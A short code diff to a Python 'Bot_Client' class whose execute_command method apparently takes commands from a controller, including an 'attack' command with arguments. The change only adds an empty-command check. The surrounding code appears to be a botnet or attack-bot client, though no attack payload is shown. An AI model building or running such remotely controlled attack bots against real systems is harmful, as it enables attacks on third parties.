@@ -126,6 +126,8 @@ class Bot_Client:
     # function to receive and execute the command sent by the controller
     def execute_command(self, command):
         command = command.split() # split command into list
+        if len(command) <= 0:
+            return
         if command[0] == "attack":
             if len(command) != 3:
                 self.log("Error: Attack Failed due to incorrect number of arguments.")
